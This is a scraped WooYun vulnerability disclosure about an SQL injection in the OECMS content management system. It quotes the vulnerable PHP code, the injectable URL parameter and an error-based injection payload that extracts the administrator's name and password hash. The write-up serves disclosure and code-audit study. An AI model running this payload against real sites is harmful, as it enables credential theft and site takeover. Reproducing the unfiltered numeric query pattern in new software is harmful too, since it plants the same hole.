{"id": 43779, "wybug_id": "wooyun-2014-081689", "wybug_title": "OEcms通用SQL注入一枚（无视全局过滤）", "wybug_corp": "OECMS", "wybug_author": "路人甲", "wybug_date": "2014-11-05 16:22", "wybug_open_date": "2015-02-03 16:24", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射", "源码审核", "源码分析"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-05：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-02-03：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： OEcms通用SQL注入一枚（无视全局过滤） 详细说明：  \n补充内容：wooyun审核的大大让我补充案例来证明通用性，我想说，OECMS已经在wooyun通过过通用漏洞了，见这里 WooYun: 代码审计系列9: OEcms 远程代码执行(CSRF) ；既然让我补充那我就补充一下吧。google:powered by oecms\n\n官网提供的部分案例如下\n\n\n\nOECMS的用户量还是不小的。这里有一个问题需要说明，本漏洞出在OECMS最新的版本，是2014.10.08升级的一个文件中，原来的版本中并不存在，所以在网络上无法找到更多的真实案例，我想wooyun审核的大大可以理解，这并不能说这个漏洞不是通用或者危害不大，下图证明oecms4.2漏洞所在文件的更新的时间\n\n\n\n现在拿网上的一个真实案例来说明一下，见下图\n\n\n\n\n看到LaiX的这个漏洞 WooYun: 代码审计系列9: OEcms 远程代码执行(CSRF) ，然后搜索了一下，没有找到OEcms的其他漏洞，只有一个漏洞？这明显不科学，挖下吧。OEcms首先对用户的各种输入做了全局过滤，/source/core/run.conf.php\n无关代码function daddslashes($string) {\tif(!MAGIC_QUOTES_GPC) {\t\tif(is_array($string)) {\t\t\tforeach($string as $key => $val) {\t\t\t\t$string[$key] = daddslashes($val);\t\t\t}\t\t} else {\t\t\t$string = addslashes($string);\t\t}\t}\treturn $string;}if (isset($_REQUEST['GLOBALS']) OR isset($_FILES['GLOBALS'])){\texit('Request tainting attempted.');}$_GET       = daddslashes($_GET);$_POST      = daddslashes($_POST);$_COOKIE\t= daddslashes($_COOKIE);$_REQUEST   = daddslashes($_REQUEST);$_FILES     = daddslashes($_FILES);$_SERVER\t= daddslashes($_SERVER);无关代码\n然后在执行sql的时候，很多输入又做了过滤，我没有找到可以绕过’过滤的注入，既然不能绕过，那就不用’了吧，找到了个数字型的注入点，无需考虑’的闭合问题了。先看代码/source/control/index/buylist.php\n无关代码public function control_dellist()    {         X::loadUtil('request');        $id = XRequest::getGet('id');        $model = parent::model('buylist', 'im');        $model->del($id);        unset($model);}无关代码\n看到$id是通过getGet('id')获得的，再看看getGet()\npublic static function getGet($name = '') {\t\tif (empty($name)) return $_GET;\t\treturn (isset($_GET[$name])) ? $_GET[$name] : '';\t}\n没有进行任何形式的过滤，然后就带入sql执行了\npublic function del($id)    {        parent::$obj->query('DELETE from ' . DB_PREFIX . 'tmpbuy where id=' . $id);    }\n虽然进行了全局过滤，但是仅用daddslashes过滤，对于数字型的注入来说，起不到作用，轻松绕过，注入成功。注入点在这里：www.xxx.com/index.php?c=buylist&a=dellist&id=2 id存在error-based blind注入Payload:\nor (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x23,(SELECT concat(adminname,0x23,password)FROM oecmspre_admin LIMIT 0,1),0x23,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.tables GROUP BY x)a)\n正常执行sql语句是这样的\n\n执行注入sql语句\n\n管理员的用户名和密码出来了\n\n   漏洞证明：  见 详细说明   修复方案：  intval   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}